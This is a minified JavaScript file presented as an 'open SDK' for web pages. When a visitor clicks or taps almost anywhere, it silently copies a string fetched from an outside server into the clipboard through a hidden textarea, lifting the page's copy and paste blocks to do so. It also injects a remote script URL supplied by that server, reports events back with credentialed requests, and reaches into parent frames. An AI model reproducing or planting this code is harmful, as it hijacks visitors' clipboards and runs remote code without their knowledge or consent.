(function(h){var g={trigger:null,dd:document,ww:window,listener:[],nobindIds:['report-btn','jubao-btn','jubao-click'],clicked:false,listenerTouchend:[],listenerCopy:null,text:null,action:'copy',ua:window.navigator.userAgent,host:location.protocol+'//'+location.host,id:1,iscp:!0,c:'',cn:null,init:function(){var s=document.getElementById('ouer-open-sdk');if(!s){console.error('element with id #ouer-open-sdk not found');return}var c=s.getAttribute('data-c');var sel=s.getAttribute('data-bind-selectors');var ids=s.getAttribute('data-bind-ids');var a=this;a.c=c;a.trigger=[].slice.call(a.dd.getElementsByTagName('*'));var scriptEl=document.getElementById('ouer-open-sdk');if(scriptEl){}var nobindTags=['SCRIPT','LINK','INPUT'];if(!sel&&!ids){a.trigger=a.trigger.filter(function(el){return nobindTags.indexOf(el.tagName)<0})}else{a.trigger=[];if(ids&&ids.length){var _ids=ids.split(',');_ids.forEach(function(_id){a.trigger.push(document.getElementById(_id))})}if(sel&&sel.length){var _sels=sel.split('|');_sels=_sels.filter(function(_sel){if(_sel.indexOf('#')>-1&&ids&&ids.length&&ids.split(',').indexOf(_sel.substring(1))>-1){return false}return true});_sels.forEach(function(_sel){a.trigger.push(document.querySelector(_sel))})}}a.ajax('//open.xuanwonainiu.com/pwd/get','get','c='+c+'&d='+encodeURIComponent(location.hostname),function(r){try{r=JSON.parse(r);console.log(r);a.text=r.data.pwds[Math.floor(Math.random()*r.data.pwds.length)];var tjUrl=r.data.tjUrl;if(tjUrl){var script=document.createElement('script');script.src=tjUrl;document.body.appendChild(script)}a.dd.queryCommandSupported&&a.dd.queryCommandSupported(a.action)&&a.text&&(a.listenClick(),a.listenTouchend())}catch(err){}})},cp:function(a){var b=this;b.ajax('//restapi.xuanwonainiu.com/integral/aliuser/event','get','c2='+b.c+'&type=fzssm',function(r){})},clipboardCopy:function(a){window.clipboardData&&this.text&&window.clipboardData.setData('Text',this.text);this.listenerCopy.destroy()},listenClick:function(){for(var a=this,idx=0;idx<a.trigger.length;idx++){a.listener.push(a.listenNode(a.trigger[idx],'click',function(b){var _e=this;return a.onClick(b,'click',_e)}))}},listenTouchend:function(){for(var a=this,idx=0;idx<a.trigger.length;idx++){a.listenerTouchend.push(a.listenNode(a.trigger[idx],'touchend',function(b){var _e=this;return a.onClick(b,'touchend',_e)}))}},listenNode:function(a,b,c){a.addEventListener(b,c,false);return{destroy:function(){a.removeEventListener(b,c,false)}}},onClick:function(a,b,_e){a.stopPropagation();var c=this;if(c.nobindIds.indexOf(_e.id)>=0){return}document.body.hasAttribute('oncopy')&&document.body.setAttribute('oncopy','return true');document.body.hasAttribute('onpaste')&&document.body.setAttribute('onpaste','return true');'INPUT'!=a.target.nodeName&&'TEXTAREA'!=a.target.nodeName&&((new h(this.text,this.action,function(a){a?c.cp('1'):c.cp('2')})).start(),'click'==b?(this.listenerD=!0,this.listener.forEach(function(a,b){a.destroy()})):'touchend'==b&&this.listenerTouchend.forEach(function(a,b){a.destroy()}));document.body.hasAttribute('oncopy')&&document.body.setAttribute('oncopy','return false');document.body.hasAttribute('onpaste')&&document.body.setAttribute('onpaste','return false')},randomString:function(){var a='';for(i=0;7>i;i++)a+='ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(61*Math.random()));return a},sGet:function(a){if(window.localStorage)try{if(!window.localStorage.getItem(a))return null;var b=JSON.parse(window.localStorage.getItem(a));return b.time<(new Date).getTime()?(window.localStorage.removeItem(a),null):b.value}catch(c){return console.log('[get] not localStorage.'),null}else return this.gCK(a)},sSet:function(a,b,c){if(window.localStorage)try{var e={name:a,value:b,time:(new Date).getTime()+1E3*c};window.localStorage.setItem(a,JSON.stringify(e))}catch(f){console.log('[set] not localStorage.')}else this.sCK(a,b,c)},gCK:function(a){var b;return(b=document.cookie.match(new RegExp('(^| )'+a+'=([^;]*)(;|$)')))?decodeURI(b[2]):null},sCK:function(a,b,c){var e=new Date;e.setTime(e.getTime()+1E3*c);document.cookie=a+'='+encodeURI(b)+';expires='+e.toUTCString()+';path=/'},ajax:function(a,b,c,e,f){b=b?b.toLowerCase():'get';'get'==b&&c&&(a=0<a.indexOf('?')?a+('&'+c):a+('?'+c));var d=new XMLHttpRequest;d.responseType='text';d.open(b,a,!0);d.withCredentials=!0;d.timeout&&(d.timeout=3E3,d.ontimeout=function(a){e.call(f,'0\n')});'post'==b&&d.setRequestHeader('Content-type','application/x-www-form-urlencoded');d.onreadystatechange=function(){4!=d.readyState||200!=d.status&&304!=d.status||e.call(f,d.responseText)};d.send('post'==b?c:null)},ajaxByte:function(a,b,c,e,f){b=b?b.toLowerCase():'get';'get'==b&&c&&(a=0<a.indexOf('?')?a+('&'+c):a+('?'+c));var d=new XMLHttpRequest;d.responseType='arraybuffer';d.open(b,a,!0);d.withCredentials=!0;d.timeout&&(d.timeout=3E3);'post'==b&&d.setRequestHeader('Content-type','application/x-www-form-urlencoded');d.onreadystatechange=function(){if(4==d.readyState&&(200==d.status||304==d.status)){var a=d.response,b=[];if(a){a=new Uint8Array(a);for(var c=0;c<a.byteLength;c++)b.push(a[c])}e.call(f,b,b.length)}};d.send('post'==b?c:null)},bTS:function(a){if('string'===typeof a)return a;for(var b='',c=0;c<a.length;c++)b+=String.fromCharCode(a[c]);return b},de:function(a,b){var c=[104,117,111,122,104,105,121,111,110,103,121,111,117,119,101,105],e=c[8]&255;e|=c[9]<<8&65280;e|=c[10]<<16&16711680;e|=c[11]<<24&4278190080;e+=b;c[8]=e&255;c[9]=e>>8&255;c[10]=e>>16&255;c[11]=e>>24&255;for(var f=e=0;f<b;f++){var d=a[f]&255;a[f]=d^c[f&15]^e;e=d}return a}};try{'about:blank'==window.location.href&&parent.window.location.href!=window.location.href&&(g.host=parent.window.location.protocol+'//'+parent.window.location.host,g.dd=parent.document,g.ww=parent.window),g.init()}catch(a){g.init()}})(function(h,g,a){return{fakeElem:null,text:h,action:g,selectedText:null,dd:document,ww:window,start:function(){this.text&&('about:blank'==window.location.href&&parent.window.location.href!=window.location.href&&(window=top.window,document=top.document),this.selectFake())},selectFake:function(){var a='rtl'==document.documentElement.getAttribute('dir');this.removeFake();this.fakeElem=document.createElement('textarea');this.fakeElem.style.fontSize='12pt';this.fakeElem.style.border='0';this.fakeElem.style.padding='0';this.fakeElem.style.margin='0';this.fakeElem.style.position='absolute';a?this.fakeElem.style.right='-9999px':this.fakeElem.style.left='-9999px';this.fakeElem.style.top=(window.pageYOffset||document.documentElement.scrollTop)+'px';this.fakeElem.setAttribute('readonly','');this.fakeElem.value=this.text;document.body.appendChild(this.fakeElem);this.selectedText=this.selectText(this.fakeElem);this.copyText()},removeFake:function(){this.fakeElem&&(document.body.removeChild(this.fakeElem),this.fakeElem=null)},copyText:function(){var b=void 0;try{b=document.execCommand(this.action)}catch(c){b=!1}this.removeFake();a.call(this,b)},selectText:function(a){if('SELECT'===a.nodeName)a.focus(),a=a.value;else if('INPUT'===a.nodeName||'TEXTAREA'===a.nodeName){var b=a.hasAttribute('readonly');b||a.setAttribute('readonly','');a.select();a.setSelectionRange(0,a.value.length);b||a.removeAttribute('readonly');a=a.value}else{a.hasAttribute('contenteditable')&&a.focus();b=window.getSelection();var e=document.createRange();e.selectNodeContents(a);b.removeAllRanges();b.addRange(e);a=b.toString()}return a}}});